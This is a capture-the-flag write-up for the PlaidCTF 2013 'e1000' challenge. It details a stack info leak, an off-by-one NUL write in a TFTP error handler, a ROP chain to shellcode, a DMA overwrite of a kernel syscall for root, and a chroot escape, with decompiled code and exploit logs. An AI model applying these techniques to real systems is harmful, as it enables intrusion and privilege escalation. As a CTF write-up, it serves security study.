# pCTF 2013 . e1000 (pwnable 250, 350)

## Challenge Description

> Pwn this thing :)

## Getting Started

For e1000, we are provided with a virtual machine disk image intended to be run inside of QEMU. The included README file shows that there should be a service running on UDP port 4444. Inside the disk image, we find a run.sh script in the /root directory, which starts up the service.

<pre>
root@debian:~# cat run.sh
#!/bin/sh
rmmod e1000
modprobe e1000-user
/root/e1000
root@debian:~# file e1000
e1000: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, stripped
root@debian:~# file /lib/modules/2.6.32-5-686/e1000-user.ko
/lib/modules/2.6.32-5-686/e1000-user.ko: ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped
</pre>

The run.sh scripts shows that there are two binaries of potential interest:
1. /root/e1000, a 32-bit user-mode ELF executable
2. /lib/modules/2.6.32-5-686/e1000-user.ko, a 32-bit kernel-mode driver
We can also see from the run.sh script that the e1000 driver is unloaded before inserting the e1000-user module. The e1000 driver handles Intel gigabit network cards, so it seems like we have a user-mode implementation of a driver for a PCI network card. Neat.

## Analysis

### e1000-user.ko

The kernel-mode driver isn't stripped, so it should be easier to reverse, so let's start there.

```c
int init_module()
{
  int registerResult;
  void *pageBuffer;
  char *keyCachePtr;
  void (**traceFunc)(signed int, char *);
  int i;

  registerResult = misc_register(&e1000_user_miscdev); // create /dev/e1000-user
  if ( registerResult )
  {
    printk("<3>%s: Could not register misc device\n", "e1000_user_init");
    return registerResult;
  }
  device_create_file(device, &dev_attr_dma_phys); // create /sys/class/misc/e1000-user/dma_phys
  device_create_file(device, &dev_attr_dma_virt); // create /sys/class/misc/e1000-user/dma_virt
  device_create_file(device, &dev_attr_key_phys); // create /sys/class/misc/e1000-user/key_phys
  device_create_file(device, &dev_attr_key_virt); // create /sys/class/misc/e1000-user/key_virt
  pageBuffer = get_free_pages(208, 8);  // power of 2 allocation... 2^8 == 256 pages == 1 MiB
  dmabuf = pageBuffer;
  if ( !pageBuffer )
  {
    printk("<3>%s: Could not allocate buffer\n", "e1000_user_init");
    goto failed;
  }
  memset(pageBuffer, 0, 0x100000u);
  dmabuf_addr = dmabuf + 0x40000000;
  keyCachePtr = (char *)kmem_cache_alloc((void *)0x80011E4, 208); // allocate an object
  if ( _tracepoint_kmalloc[1] )
  {
    traceFunc = (void (**)(int, void *))_tracepoint_kmalloc[4];
    for ( ; traceFunc; traceFunc++ )
    {
      (*traceFunc)(256, keyCachePtr);
    }
  }
  keyPtr = keyCachePtr;
  if ( !keyCachePtr )
  {
    printk("<3>%s: Could not allocate key buffer\n", "e1000_user_init");
    goto failed;
  }
  key_addr = keyCachePtr + 0x40000000;
  return registerResult;

failed:
  misc_deregister(&e1000_user_miscdev);
  return -12;
}
```

Nothing too interesting in the initialize function. It basically allocates some contiguous pages for DMA, and registers a device file and some sys interfaces. Let's take a look at the device file operations next. e1000_user_open and e1000_user_release simply return success. What about e1000_user_mmap?

```c
int e1000_user_mmap(void* filp, struct_vm_area_struct *vm_area_struct)
{
  int result;

  if ( !(vm_area_struct->vm_flags & 8) )
  {
    printk("<3>%s: Mapping must be shared.\n", "e1000_user_mmap");
    return -22;
  }
  if ( vm_area_struct->vm_offset )
  {
    printk("<3>%s: Mapping must start at 0.\n", "e1000_user_mmap");
    return -22;
  }
  if ( (unsigned int)(vm_area_struct->vm_end - vm_area_struct->vm_start) <= 0x100000 )
  {
    if ( boot_cpu_data[0] > 3u )
      vm_area_struct->vm_pgprot |= 0x10u;
    vm_area_struct->vm_flags |= 0x40000u;       // non-expandable mapping
    // remap pages starting at offset to vm_start
    result = remap_pfn_range((dmabuf_addr + vm_area_struct->vm_offset) >> 12,
                             vm_area_struct->vm_start) >= 1 ? -11 : 0;
  }
  else
  {
    printk("<3>%s: Mapping can't be larger than %d\n", "e1000_user_mmap", 0x100000);
    result = -22;
  }
  return result;
}
```

Nothing much to see here. It maps the previously allocated DMA buffer into the user-mode process's virtual address space. The various sys files simply report the virtual and physical addresses for the allocations. The code doesn't do too much, and there's no obvious vulnerabilities, so let's move on the user-mode e1000 executable. 

### e1000

First of all, it's important to notice that this binary has been compiled with the -fPIC -pie options in gcc, meaning it is a .Position Independent Executable. (PIE). This means that the entire binary and its associated libraries can be relocated to any address, allowing ASLR to affect all sections of the binary. So, even if we manage a memory corruption vulnerability, we will need an information leak that tells us the offset of an executable section of code in order to build a ROP chain.

```c
int main(int argc, char** argv)
{
  struct pci_device_iterator *pci_iterator;
  pci_device *pci_device;
  pci_id_match match;
  ethInfo *device;
  int device_class;

  memset(&match, 0, sizeof(match));
  match.vendor_id = 0x8086;
  match.device_id = -1;
  match.subvendor_id = -1;
  match.subdevice_id = -1;
  match.device_class = 0x20000;
  match.device_class_mask = 0xFFFF0000;
  pci_system_init();
  pci_iterator = pci_id_match_iterator_create(&match);
  pci_device = pci_device_next(pci_iterator);
  if ( !pci_device )
  {
    __fprintf_chk(stderr, 1, "No devices found.\n");
    exit(1);
  }
  pci_device_probe(pci_device);
  device_class = pci_device->device_class;
  __printf_chk(1, "class: %08x\n", device_class);
  LoadDevice(&device, pci_device);
  drop_priv_e1000();
  setup_device_handler(device, DoHandleUser);
  recvLoop(device);
}
```

Before dropping privileges, e1000 uses libpciaccess to find an Intel (vendor id: 0x8086) network controller (class 0x02) device. It then attaches to it and configures it through the PCI memory-mapped registers in LoadDevice (0x2509) and setup_device_handler (0x2dd8) functions. Additionally a callback method for receiving packets is registered: DoHandleUser (0x10b4). The only other interesting thing here is in the drop_priv_e1000 function (0x1122), is that it uses the chroot function to set the root directory as the e1000 user's home directory (/home/e1000). The recvLoop function (0x10f5) repeatedly calls a function to check for and handle waiting packets with a call to usleep in between. Let's take a closer look at the actual packet reception function located at 0x13f2:

```c
int recv_pkt(ethInfo *dev)
{
  ...
      __printf_chk(1, "Rx packet: desc=%d, len=%d\n", desc, verlen);
  ...
        stkAlloc = alloca(verlen + 15);
        ethPkt = (eth_pkt *)((unsigned int)((char *)&v35 + 3) & 0xFFFFFFF0);
        memcpy(
          (void *)((unsigned int)((char *)&v35 + 3) & 0xFFFFFFF0),
          *((const void **)&v35->dma_zone_rx_desc_virt + 3 * desc),
          verlen);
  ...
                    if ( verlen >= udpLength && udpLength > 7u )
                    {
                      handleFunc = dev->handleFunc;
                      if ( handleFunc )
                      {
                        handleFunc(
                          dev,
                          srcPort,
                          peerIp,
                          peerPort,
                          &udpPayload,
                          udpLength - 8);
                      }
  ...
}
```

Uninteresting sections of the code have been removed for brevity. Of interest here is that the packet is being copied to the stack with a variable-sized buffer allocated using the alloca function (ESP -= (pktLen + 15) & 0xfffffff0). Other than that, this function just calls the specified handler for UDP packets. Let's take a look at the handler function. DoHandleUser (0x10b4) just checks if the destination port is 4444, and if so, passes it on to the actual handler function located at 0x465d.

```c
void HandleUser(ethInfo *dev, int dstPort, int peerIp, short peerPort, tftp_pkt *tftpPkt, unsigned payLength)
{
  sessionInfo *sessionInfo;
  unsigned short opcode;
  fileInfo *fileInfo;
  fileInfo fileInfoStk;
  char *filename;
  sessionInfo *curSession;
  sessionInfo **prevSessionNextPtr;
  const char *cmdType;
  int isNetAscii;
  int isOctet;
  const char *mode;
  int lastBlock;
  unsigned short blocknum;
  int prevLength;
  size_t totalLength;
  char *dataBuffer;
  int curOffset;
  unsigned int curLength;

  if ( payLength > 3 )
  {
    sessionInfo = sessions;
    opcode = ntohs(tftpPkt->opcode);
    while ( 1 )
    {
      if ( !sessionInfo )
      {
        if ( opcode > 2 )
          return;
        newSession = (sessionInfo *)calloc(1u, 0x24u);
        sessionInfo = newSession;
        if ( !newSession )
          return;
        newSession->dev = dev;
        newSession->operation = opcode;
        newSession->peerIp = peerIp;
        newSession->peerPort = peerPort;
        sessionInfo->next = sessions;
        sessions = sessionInfo;
        goto LABEL_handlePacket;
      }
      if ( sessionInfo->peerIp == peerIp )
      {
        if ( sessionInfo->peerPort == peerPort )
          break;
      }
      sessionInfo = sessionInfo->next;
    }
    if (opcode <= 2 )
    {
      fileInfo = sessionInfo->fileInfo;
      filename = "";
      if ( fileInfo )
        filename = fileInfo->fileName;
      sock_errorf(sessionInfo, 4, "Not expecting RRQ/WRQ (current file: %s)", filename);
LABEL_unlinkSession:
      curSession = sessions;
      prevSessionNextPtr = &sessions;
      while ( curSession && curSession != sessionInfo )
      {
        prevSessionNextPtr = &curSession->next;
        curSession = curSession->next;
      }
      *prevSessionNextPtr = curSession->next;
      return;
    }
LABEL_handlePacket:
    switch ( opcode)
    {
      case 1:                                   // Get File
        sessionInfo->blkSize = 512;
        sessionInfo->blocknum = 1;
        memset(&fileInfoStk, 0, sizeof(fileInfoStk));
        fileInfoStk.fileName = (char *)&tftpPkt->payload;
        fileInfo = find_file(fileListHead, &fileInfoStk);
        if ( fileInfo )
        {
          sessionInfo->fileInfo = fileInfo;
          cmdType = &tftpPkt->payload.rw_request.mode[strlen((const char *)&tftpPkt->payload)];
          isNetAscii = strcasecmp("netascii", cmdType);
          if ( !isNetAscii )
          {
            sessionInfo->mode = 1;
            goto LABEL_91;
          }
          isOctet = strcasecmp("octet", cmdType);
          if ( !isOctet )
          {
            sesssionInfo->mode = 2;
            goto LABEL_91;
          }
          sock_errorf(sessionInfo, 4, "Bad mode");
        }
        else
          sock_errorf(sessionInfo, 1, "File not found (%s)", fileInfoStk.fileName);
        goto LABEL_unlinkSession;
      case 2:                                   // Put File
        sessionInfo->blkSize = 512;
        sessionInfo->blocknum = 0;
        fileInfo = (fileInfo *)calloc(1u, 0x18u);
        if ( !fileInfo )
          return;
        fileInfo->fileName = strdup((const char *)&tftpPkt->payload);
        if ( !fileInfo->fileName )
        {
          free(fileInfo);
          return;
        }
        if ( num_files(fileListHead) > 4096 )
        {
          sock_errorf(sessionInfo, 0, "Max file count hit, restarting");
          exit(0);
        }
        if ( find_file(fileListHead, fileInfo) )
        {
          sock_errorf(sessionInfo, 6, "File exists (%s)", fileInfo->fileName);
          free(fileInfo->fileName);
          free(fileInfo);
        }
        else
        {
          add_file(&fileListHead, fileInfo);
          sessionInfo->fileInfo = fileInfo;
          mode = &tftpPkt->payload.rw_request.mode[strlen((const char *)&tftpPkt->payload)];
          isNetAscii = strcasecmp("netascii", mode);
          if ( !isNetAscii )
          {
            sessionInfo->mode = 1;
            goto LABEL_63;
          }
          isOctet = strcasecmp("octet", mode);
          if ( !isOctet )
          {
            sessionInfo->mode = 2;
            goto LABEL_63;
          }
          sock_errorf(sessionInfo, 4, "Bad mode");
        }
        goto LABEL_unlinkSession;
      case 3:                                   // Put Data
        if ( sessionInfo->operation == 2 )
        {
          lastBlock = sessionInfo->blocknum;
          blocknum = ntohs(tftpPkt->payload.data.blocknum);
          if ( blocknum == lastBlock )
          {
LABEL_63:
            sendAck(sessionInfo);
            return;
          }
          if ( blocknum == lastBlock + 1 )
          {
            prevLength = sessionInfo->blkSize * lastBlock;
            totalLength = prevLength + payLength - 4;
            curLength = payLength - 4;
            if ( totalLength <= 16384 )
            {
              fileInfo = sessionInfo->fileInfo;
              curOffset = prevLength;
              fileInfo->totalLength = totalLength;
              fileInfo->dataBuffer = (char *)realloc(fileInfo->dataBuffer, totalLength);
              dataBuffer = fileInfo->dataBuffer;
              if ( !dataBuffer )
                return;
              memcpy(&dataBuffer[curOffset], &tftpPkt->payload.data.data, curLength);
              sessionInfo->blocknum = blocknum;
              sendAck(sessionInfo);
              if ( curLength >= sessionInfo->blkSize )
                return;
            }
            else
              sock_errorf(sessionInfo, 3, "Requested length (%u) > max (%u)", prevLength + payLength - 4, 0x4000);
          }
          else
            sock_errorf(sessionInfo, 5, "Bad block number");
        }
        else
          sock_errorf(sessionInfo, 4, "Not expecting DATA", v8);
        goto LABEL_unlinkSession;
      case 4:                                   // ACK
        if ( sessionInfo->operation != 1 )
        {
          sock_errorf(sessionInfo, 4, "Not expecting ACK");
          goto LABEL_unlinkSession;
        }
        blocknum = ntohs(tftpPkt->payload.ack.blocknum);
        if ( blocknum == sessionInfo->blocknum )
        {
          sessionInfo->blocknum = blocknum + 1;
LABEL_91:
          doSendData(sessionInfo);
        }
        break;
      case 5:                                   // ERROR
        goto LABEL_unlinkSession;
      default:
        return;
    }
  }
}
```

Overall, a not-too-interesting tftp implementation from the exploitation front. Files are stored in memory, but there's no way to overflow any of the buffers. It looks interesting if you could control the sessionInfo->blkSize field, you could turn that into an integer overflow, which would lead to a heap overflow. However, there doesn't seem to be anyway to affect the blkSize field without already having corrupted the heap. The states are reasonably well-protected (i.e. you can't start with a GET request and switch over to a PUT).

#### Information Leak

The response to a GET request when a file does not exist is interesting: an error message is sent with the filename from the GET request. Now, remember that the packet data that is passed to the handler function is located on the stack, and it is not NULL-terminated unless the packet itself is, so by trying different lengths of filenames, we can see what data can be leaked from the stack (since many positions on the stack will be NULL's, which will stop our infoleak). It turns out, that due to the packet being copied onto the stack with a variable-length allocation, it doesn't really matter how long the filename is, except for the 16-byte alignment. So, we find that using a 28-character filename leads to two extra addresses being concatenated onto our filename in the error response message. The first address belongs to a stored EBP address on the stack, allowing us to determine the exact addresses of data we might have on the stack. The second address is of course a stored EIP return address since it follows the saved EBP. This return address happens to be inside the e1000 binary, so from that, we can determine the load-location of the segments inside e1000 and build a ROP chain from gadgets inside of it. Now, we just need to get control of EIP.

#### False Alarm

There was one function that briefly looked like it may be of interest in the file management functions. Files sent to the tftp service are stored in a binary tree structure, sorted by their filename. The num_files function (0x3afe) loops through all of the branches in the binary tree and records intermediate count results in a fixed-sized list on the stack. If it is possible to exceed the 128 allocated list entries, it may be possible to corrupt the stack. However, this function maintains a stack cookie, so even if it were possible to overflow that list, we would never be able to get past the stack cookie without another information leak.

#### Vulnerability

Eventually, I came upon the error message function I labeled sock_errorf (0x3f15):

```c
void sock_errorf(sessionInfo *sessionInfo, short code, char *fmt, ...)
{
  int strLen;
  size_t msgLen;
  int result;
  char buf[512];
  int stkCookie;
  va_list va;

  va_start(va, fmt);
  stkCookie = *MK_FP(__GS__, 20);
  *(short *)&buf[2] = htons(code);
  *(short *)buf = 0x500;			// ERROR
  strLen = __vsnprintf_chk(&buf[4], 507, 1, 508, fmt, va);
  if ( strLen > 0 )
  {
    buf[strLen + 4] = 0; // NULL-terminate the string
    msgLen = strLen + 5;
    if ( msgLen <= sessionInfo->blkSize + 4 )
      sendPkt(sessionInfo->dev, 4444, sessionInfo->peerIp, sessionInfo->peerPort, buf, msgLen);
  }
  if ( *MK_FP(__GS__, 20) != stkCookie )
    stkChkFail();
}
```

Again, there is a stack cookie, so even if we could overflow the string, we wouldn't be able to get past the cookie. However, there is a subtle bug in this function: adding the NULL-terminator.  The issue here is that in the case of the formatted string being longer than the allowed buffer space, *snprintf returns not the number of characters actually written, but instead the number of characters that would have been written if there was enough space. So, if we control the length of the formatted string, we have the ability to write a single NULL byte somewhere in one of our parent stack frames. 

## Exploitation, Part 1

Let's take a look at the different invocations of sock_errorf where we control some of the input data in the HandleUser function:
```c
1: sock_errorf(sessionInfo, 4, "Not expecting RRQ/WRQ (current file: %s)", filename);
2: sock_errorf(sessionInfo, 1, "File not found (%s)", fileInfoStk.fileName);
3: sock_errorf(sessionInfo, 6, "File exists (%s)", fileInfo->fileName);
```

Message 1 occurs if you send a GET or PUT request to a session that has already been initialized with a GET or PUT. Message 2 occurs if you issue a GET request for a file that does not exist (which we use for the information leak above). Message 3 occurs if you attempt to PUT a file that already exists. All of these functions can be controlled by the filename input to them. There is no real limit to the length of the filename other than that it has to fit inside a single UDP packet. So, we can reach about 1000 bytes of stack space from the end of the sock_errorf function. Let's look at that the stack at that point inside a .File not found (%s). format for a failed GET:

<pre>
Rx packet: desc=2, len=100
(gdb) stack
 # | Size |    PC    |  Frame   |   Arg1   |   Arg2   |   Arg3   |   Arg4   | Symbol
---+------+----------+----------+----------+----------+----------+----------+--------
 0 |  230 | b7713f7d | bf841040 | b8d2ea10 |        1 | b7715ba5 | bf84111c | sock_errorf
 1 |   60 | b77147c8 | bf8410a0 | b8d2c810 |     115c |  202000a |     b007 | HandleUser
 2 |   30 | b77110ed | bf8410d0 | b8d2c810 |     115c |  202000a |     b007 | DoHandleUser
 3 |  100 | b771166f | bf8411d0 | b8d2c810 | b7662d9c | bf8411e0 |        0 | recv_pkt
 4 |   20 | b7711725 | bf8411f0 | b8d2c810 | bf841218 | b771112d | b7711102 | check_recv_pkt
 5 |   20 | b7711111 | bf841210 | b8d2c810 | b77110b4 |    20000 | b7711215 | recvLoop
 6 |   50 | b771129f | bf841260 | b7714df0 |        0 | bf8412e8 | b75b3ca6 | main
 7 |   90 | b75b3ca6 | bf8412f0 | b77111bb |        1 | bf841314 | b7714df0 | __libc_start_main
 8 |    0 | b7711021 | bf8412f0 | b77111bb |        1 | bf841314 | b7714df0 |

Rx packet: desc=3, len=156
(gdb) stack
 # | Size |    PC    |  Frame   |   Arg1   |   Arg2   |   Arg3   |   Arg4   | Symbol
---+------+----------+----------+----------+----------+----------+----------+--------
 0 |  230 | b7713f7d | bf841010 | b8d38940 |        1 | b7715ba5 | bf8410ec | sock_errorf
 1 |   60 | b77147c8 | bf841070 | b8d2c810 |     115c |  202000a |     b44f | HandlerUser
 2 |   30 | b77110ed | bf8410a0 | b8d2c810 |     115c |  202000a |     b44f | DoHandleUser
 3 |  130 | b771166f | bf8411d0 | b8d2c810 | b7662d9c | bf8411e0 |        0 | recv_pkt
 4 |   20 | b7711725 | bf8411f0 | b8d2c810 | bf841218 | b771112d | b7711102 | check_recv_pkt
 5 |   20 | b7711111 | bf841210 | b8d2c810 | b77110b4 |    20000 | b7711215 | recvLoop
 6 |   50 | b771129f | bf841260 | b7714df0 |        0 | bf8412e8 | b75b3ca6 | main
 7 |   90 | b75b3ca6 | bf8412f0 | b77111bb |        1 | bf841314 | b7714df0 | __libc_start_main
 8 |    0 | b7711021 | bf8412f0 | b77111bb |        1 | bf841314 | b7714df0 |

Rx packet: desc=4, len=1500
(gdb) stack
 # | Size |    PC    |  Frame   |   Arg1   |   Arg2   |   Arg3   |   Arg4   | Symbol
---+------+----------+----------+----------+----------+----------+----------+--------
 0 |  230 | b7713f7d | bf840ad0 | b8d42918 |        1 | b7715ba5 | bf840bac | sock_errorf
 1 |   60 | b77147c8 | bf840b30 | b8d2c810 |     115c |  202000a |     b8cf | HandleUser
 2 |   30 | b77110ed | bf840b60 | b8d2c810 |     115c |  202000a |     b8cf | DoHandleUser
 3 |  670 | b771166f | bf8411d0 | b8d2c810 | b7662d9c | bf8411e0 |        0 | recv_pkt
 4 |   20 | b7711725 | bf8411f0 | b8d2c810 | bf841218 | b771112d | b7711102 | check_recv_pkt
 5 |   20 | b7711111 | bf841210 | b8d2c810 | b77110b4 |    20000 | b7711215 | recvLoop
 6 |   50 | b771129f | bf841260 | b7714df0 |        0 | bf8412e8 | b75b3ca6 | main
 7 |   90 | b75b3ca6 | bf8412f0 | b77111bb |        1 | bf841314 | b7714df0 | __libc_start_main
 8 |    0 | b7711021 | bf8412f0 | b77111bb |        1 | bf841314 | b7714df0 |
</pre>

As you can see, the stack frame for recv_pkt changes based upon the size of the packet. This lines up with the alloca call we saw previously. Additionally, we can see that Arg4 for sock_errorf points into that stack frame. To exploit the NULL-byte overwrite, we will need to attack a stored EBP value on the stack. After EBP is corrupted, ideally the calling function would not reference any other local variables via EBP prior to returning (otherwise it may attempt to dereference invalid data or overwrite our ROP payload). Then the calling function should call something like leave; ret which is equivalent to mov esp, ebp; pop ebp; ret. At this point, if we control the data located at EBP, we also control ESP, and ret will return into our ROP chain, giving us code execution.

In order for us to control the data at EBP & 0xffffff00, we need to control some data on the stack of a parent stack frame. So, our candidate functions are HandleUser, DoHandleUser, recv_pkt, and check_recv_pkt. In the last stack frame provided (with the 1500-byte packet), we directly control data from 0xbf8408c0-0xbf840aaa in the error string as well as data from 0xbf840bac-0xbf84115c from the raw packet. We could attempt to attack the saved EBP inside of sock_errorf, however, HandleUser references an EBP-based local variable after returning from the error function to unlink the current session from the session list. 

Unfortunately, this code fails with a NULL-dereference if the specified session is not in the session list, so we would need a valid session pointer from the heap for this to work. So, if we wanted to pursue this attack route, we would need to spray the heap with hanging open sessions. Since the protocol is UDP-based, we can spoof the source IP address and do this pretty effectively. However, the heap is subject to 32MB of ASLR, so you would need to send a lot of packets for this to work, and it's still possible that the alignment of the session objects on the heap wouldn't line up with the chosen value (although there is another infoleak available that can reduce the amount heap you would need to spray down to 16MB, it would still require nearly 400,000 packets to get coverage). So, we would instead prefer to attack the frame pointer belonging to frame 4: check_recv_pkt because check_recv_pkt does not reference EBP at all prior to returning, and as an added bonus, we have the full contents of our packet in contiguous memory to ROP around in.

Now, the problem is that in order to reach that frame pointer, we need the return value from __vsnprintf_chk to be larger than our packet, but our packet is allocated on the stack in between the sock_errorf stack frame and the saved EBP belonging to check_recv_pkt. So, we are out of luck. But, let's take one last look at the different invocations of sock_errorf with user-controlled input:

```c
1: sock_errorf(sessionInfo, 4, "Not expecting RRQ/WRQ (current file: %s)", filename);
2: sock_errorf(sessionInfo, 1, "File not found (%s)", fileInfoStk.fileName);
3: sock_errorf(sessionInfo, 6, "File exists (%s)", fileInfo->fileName);
```

Options 2 and 3 both take the filename from the current packet, but option 1 is different: it takes the filename stored in the session structure from the packet that started the session. So, if we use that, we can put a long filename in the first packet, which controls the index into the stack frame, and a shorter filename in the subsequent packet, which controls the size of the stack frame. This allows us to extend our reach into the desired stack frame after our packet data. There is also a secondary advantage to doing it this way: since the second packet does not end up going in the format string, we can freely use NULL-values in it (which is where our ROP code and shellcode will be). Being able to use NULL is a big help for setting up the parameters to mmap. Note that for this to work, the session must not be unlinked after the first packet (i.e. we need a valid GET or PUT request). Let's look at the stack frames that demonstrate this:

<pre>
1: x/i $eip
=> 0xb77d2f7d:  mov    BYTE PTR [ebp+eax*1-0x218],0x0
(gdb) stack
 # | Size |    PC    |  Frame   |   Arg1   |   Arg2   |   Arg3   |   Arg4   | Symbol
---+------+----------+----------+----------+----------+----------+----------+--------
 0 |  230 | b77d2f7d | bfe4ec80 | b9331d20 |        4 | b77d4b7c | b9331d48 | sock_errorf
 1 |   60 | b77d36d5 | bfe4ece0 | b931b810 |     115c |  202000a |     e8d4 | HandleUser
 2 |   30 | b77d00ed | bfe4ed10 | b931b810 |     115c |  202000a |     e8d4 | DoHandleUser
 3 |  320 | b77d066f | bfe4f030 | b931b810 | b7721d9c | bfe4f040 |        0 | recv_pkt
 4 |   20 | b77d0725 | bfe4f050 | b931b810 | bfe4f078 | b77d012d | b77d0102 | check_recv_pkt
 5 |   20 | b77d0111 | bfe4f070 | b931b810 | b77d00b4 |    20000 | b77d0215 | recvLoop
 6 |   50 | b77d029f | bfe4f0c0 | b77d3df0 |        0 | bfe4f148 | b7672ca6 | main
 7 |   90 | b7672ca6 | bfe4f150 | b77d01bb |        1 | bfe4f174 | b77d3df0 | __libc_start_main
 8 |    0 | b77d0021 | bfe4f150 | b77d01bb |        1 | bfe4f174 | b77d3df0 |
(gdb) print $eax
$14 = 1480
(gdb) print $ebp+$eax-0x218
$15 = (void *) 0xbfe4f028
</pre>

In this case, EAX is the return value from __vsnprintf_chk: 1480, however the packet we sent fits into the 0x320 (800 decimal) sized stack frame for recv_pkt. We're about to write a NULL byte into EBP+EAX-0x218 => 0xbfe4f028, which is the low-order byte of the saved EBP value on stack frame 3. Unfortunately, due to the ASLR layout we received this time, this means we will set EBP => 0xbfe4f000, which is not in our controlled space. I could not figure out a way to exploit this ASLR layout, so instead I will just crash the service and allow it to be restarted with a different stack alignment. Let's look at a more favorable stack layout:

<pre>
1: x/i $eip
=> 0xb775ff7d:  mov    BYTE PTR [ebp+eax*1-0x218],0x0
(gdb) stack
 # | Size |    PC    |  Frame   |   Arg1   |   Arg2   |   Arg3   |   Arg4   | Symbol
---+------+----------+----------+----------+----------+----------+----------+--------
 0 |  230 | b775ff7d | bfed1a10 | b9133a60 |        4 | b7761b7c | b9133c60 | sock_errorf
 1 |   60 | b77606d5 | bfed1a70 | b9131810 |     115c |  202000a |     92b5 | HandleUser
 2 |   30 | b775d0ed | bfed1aa0 | b9131810 |     115c |  202000a |     92b5 | DoHandleUser
 3 |  320 | b775d66f | bfed1dc0 | b9131810 | b76aed9c | bfed1dd0 |        0 | recv_pkt
 4 |   20 | b775d725 | bfed1de0 | b9131810 | bfed1e08 | b775d12d | b775d102 | check_recv_pkt
 5 |   20 | b775d111 | bfed1e00 | b9131810 | b775d0b4 |    20000 | b775d215 | recvLoop
 6 |   50 | b775d29f | bfed1e50 | b7760df0 |        0 | bfed1ed8 | b75ffca6 | main
 7 |   90 | b75ffca6 | bfed1ee0 | b775d1bb |        1 | bfed1f04 | b7760df0 | __libc_start_main
 8 |    0 | b775d021 | bfed1ee0 | b775d1bb |        1 | bfed1f04 | b7760df0 |
(gdb) print $eax
$32 = 1480
(gdb) print $ebp+$eax-0x218
$33 = (void *) 0xbfed1db8
(gdb) x/wx 0xbfed1db8
0xbfed1db8:     0xbfed1dd8
(gdb) x/wx 0xbfed1d00
0xbfed1d00:     0x41414141
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
</pre>

Now, when we set the low-order byte of the saved EBP, you can see we end up in a controlled area in the stack (0x41414141 => AAAA). At this point we have code execution, and all that's left to do to solve this part of the e1000 challenge is to write a short ROP payload to call mmap to allocate some read-write-execute space, memcpy our shellcode into it, and jump to it. Note that since this program is the only way to communicate with the network, we will need to write shellcode that will call the packet sending function located at 0x2bbb to send back the key.

<pre>
[-] Info-Leak successful, but stack alignment is not exploitable, crashing service to retry
[+] Info-Leak successful, Stack Address: 0xbff0bca8  e1000 Base: 0xb77f3000
[+] Assembled: shellcode/read_key.asm Length: 100
[+] PUT command accepted
MyVoiceIsMyPassport

Welcome back Werner Brandes. Your next job is to retrieve the key that is hidden in /root.
</pre>

## Exploitation, Part 2

Success! The first key is ours. Now, we need to determine a way to elevate our privileges and escape from the chroot jail. This task is actually a bit easier than the first task, assuming you recognize the power of direct communications with the PCI network card. The vulnerability here is that even though we have dropped privileges to the e1000 user, we still have access to the PCI configuration registers for the network card, so we can configure the DMA addresses where the "hardware" will copy incoming packets to physical memory. To exploit this, the simplest thing to do is to point the DMA addresses at a syscall implementation, and overwrite the syscall with a generic commit_creds(prepare_kernel_cred(NULL)) shellcode, so that when a process calls that syscall, it's privileges are escalated to uid=0, gid=0. Since the kernel on this system is from before ASLR was added to the Linux kernel, we can simply read the addresses for commit_creds and prepare_kernel_cred out of /proc/kallsyms or /boot/System.map-2.6.32-5-686. The syscall I've chosen to overwrite is sys_times, because nothing should really break if it doesn't do what it's supposed to (as opposed to fork, exec, open, etc), and also importantly, it has a helper function located right before it in memory that we can trash with the Ethernet, IP and UDP headers before our actual payload.

<pre>
root@debian:~# cat /proc/kallsyms | grep sys_times
c103f41f T do_sys_times
c103f4a1 T sys_times
</pre>

The final missing piece for this is to translate the kernel virtual address to a physical address. For this version of the kernel it's simple: take the virtual address and mask off the first nibble. So sys_times will be located at physical address 0x103f4a1. All we need to do now is configure the PCI device to use an offset just before sys_times as the DMA address and then send our commit_creds(prepare_kernel_cred(NULL)) shellcode to the target. After we receive the shellcode, we'll need to reset the DMA addresses so that future packets don't continue to overwrite code in the kernel address space, and so that we can actually communicate with the service normally again. The function in the binary that sets up the PCI device is located at 0x2dd8, and takes as input a pointer to the device structure and a pointer to the packet handling callback function. We can determine what addresses to modify in the device structure by looking at where the recv_pkt function copies the data from, and figuring out where the corresponding physical addresses are configured in the device setup function, or you can read the Open Source Software Developer's Manual for the NIC: http://iweb.dl.sourceforge.net/project/e1000/8257x%20Developer%20Manual/Revision%201.8/OpenSDM_8257x-18.pdf.

After sending the shellcode, we should be able to issue a sys_times syscall and our process will be elevated to root. From there, we can do an old trick to escape the chroot jail: create a subdirectory in it, then chroot to the subdirectory. Our current directory will then be outside of the jail, so we can execute chdir("..") repeatedly to get to the real root directory.  Then, we can issue a chroot(".") to fully escape and reset our root directory to the real root directory. At this point we can do another read-key shellcode to get the key, but let's do it with a little bit more flair instead and pop a full root shell.

To do that, since we don't have socket file descriptors, we will need to create two sets of pipes and process the I/O ourselves across the network stack. In the shellcode, I fork two child processes to handle the I/O from the shell to the network, and then exec("/bin/sh"). For more information, look at the associate shellcode.

<pre>
[-] Info-Leak successful, but stack alignment is unexploitable, crash and retry
[-] Info-Leak successful, but stack alignment is unexploitable, crash and retry
[+] Info-Leak successful, Stack Address: 0xbfa57ba8  e1000 Base: 0xb7716000
[+] Assembled: shellcode/stager.asm Length: 217
[+] Assembled: shellcode/dma_overwrite.asm Length: 119
[+] Assembled: shellcode/shell.asm Length: 503
[+] Assembled: shellcode/kernel.asm Length: 19
[+] PUT command accepted
[+] Stager handshake confirmed, sending payloads
[+] Sent DMA kernel-mode overwrite payload
[+] Sent execve(/bin/sh) payload
[+] Sent stager activation code
[+] Sent kernel-mode syscall overwrite, delaying 2 seconds...
[+] Sending "id"
uid=0(root) gid=0(root) groups=0(root)
pwd
/
cat /home/e1000/key
MyVoiceIsMyPassport

Welcome back Werner Brandes. Your next job is to retrieve the key that is hidden in /root.
cat /root/key
TOO_MANY_SECRETS...SETEC_ASTRONOMY
</pre>

There you have it, a UDP root shell interacting directly with the PCI network device.

Thanks to Awesie for the great challenge.

Exploit script and shellcode available under: http://github.com/moralfag/ctf/pctf2013-e1000

